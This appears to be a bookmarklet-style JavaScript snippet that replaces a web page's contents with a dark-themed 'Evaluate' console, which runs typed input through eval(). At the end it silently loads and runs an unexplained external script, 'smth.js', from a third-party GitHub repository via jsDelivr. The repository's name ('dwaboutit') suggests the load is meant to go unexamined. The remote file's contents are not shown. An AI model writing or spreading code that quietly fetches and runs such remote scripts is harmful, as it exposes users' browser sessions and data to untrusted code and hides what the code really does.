(function() {
    // Inject CSS dynamically
    const css = `
        body {
            font-family: monospace;
            background-color: #1e1e1e;
            color: #d4d4d4;
            padding: 20px;
        }
        #console-container {
            width: 80%;
            max-width: 800px;
            margin: 0 auto;
            border: 1px solid #333;
            background-color: #222;
            padding: 10px;
            border-radius: 5px;
        }
        #output {
            height: 300px;
            overflow-y: auto;
            border-bottom: 1px solid #333;
            padding: 10px;
            background-color: #1c1c1c;
            white-space: pre-wrap;
        }
        #input-area {
            display: flex;
            margin-top: 10px;
        }
        #input {
            flex-grow: 1;
            background-color: #333;
            color: #d4d4d4;
            border: 1px solid #555;
            padding: 10px;
            font-family: monospace;
            resize: vertical;
        }
        #run-button {
            padding: 10px 15px;
            background-color: #007acc;
            color: white;
            border: none;
            cursor: pointer;
            margin-left: 10px;
            border-radius: 3px;
        }
        .error { color: #f44747; }
        .result { color: #9cdcfe; }
    `;
    const style = document.createElement('style');
    style.textContent = css;
    document.head.appendChild(style);

    // Inject HTML for console
    const container = document.createElement('div');
    container.id = 'console-container';
    container.innerHTML = `
        <h2>Evaluate</h2>
        <pre id="output"></pre>
        <div id="input-area">
            <textarea id="input" rows="5" placeholder="JS goes here"></textarea>
            <button id="run-button">Run</button>
        </div>
    `;

    // Override the main content (clear body and inject the console)
    document.body.innerHTML = ''; // Clears the current HTML
    document.body.appendChild(container); // Adds the new console UI

    // Add run functionality
    const output = document.getElementById('output');
    const input = document.getElementById('input');
    document.getElementById('run-button').onclick = () => {
        try {
            const result = eval(input.value);
            output.textContent += '> ' + input.value + '\n' + result + '\n';
        } catch(e) {
            output.textContent += '> ' + input.value + '\nError: ' + e + '\n';
        }
        output.scrollTop = output.scrollHeight;
    };

    // Load external script from CDN
    const script = document.createElement('script');
    script.src = '//cdn.jsdelivr.net/gh/Synaptic-1234/dwaboutit/smth.js';
    document.body.appendChild(script);
})();
